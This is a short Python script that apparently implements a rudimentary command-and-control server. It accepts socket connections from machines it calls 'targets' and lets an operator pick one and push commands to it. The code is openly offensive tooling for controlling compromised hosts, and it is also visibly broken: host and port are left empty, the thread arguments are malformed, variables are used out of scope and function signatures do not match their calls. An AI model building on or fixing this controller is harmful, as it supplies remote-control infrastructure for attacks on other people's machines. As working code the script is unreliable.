import _thread
import socket
import time
import sys

host = ''
port = ''

conns = []
addrs = []

def server():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  try:
    s.bind((host, port))
  except:
    print("[-] Socket failed bind")
  _thread.start_new_thread(listener, args=s)
  manager(s)

def listener(s):
  s.listen(2)
  while True:
    conn, addr = s.accept()
    conns.append(conn)
    addrs.append(addr)
    _thread.start_new_thread(conn_manager, args=[conn, addr,])

def manager(s):
  shell = input("Cmd > ")
  if shell == "show targets":
    for ip in range(len(addrs)):
      print(ip)
  if shell == "set target":
    shell_ip = input("Ip > ")
  if shell == "set cmd":
    if shell_ip == "":
      print("Supply A Ip Address First")
    else:
      command = input("Command For", shell_ip, " > ")
      print("Sending Command", command, "To", shell_ip)

def conn_manager(conn, addr, shell_ip, command):
  conn_ip = addr[0]
  while True:
    try:
      usr_inpt = shell_ip
    except:
      print("")
    try:
      cmd = command
      if conn_ip == usr_inpt:
        conn.send(bytes(cmd))
        time.sleep(5)
      else:
        continue
    except:
      print("")
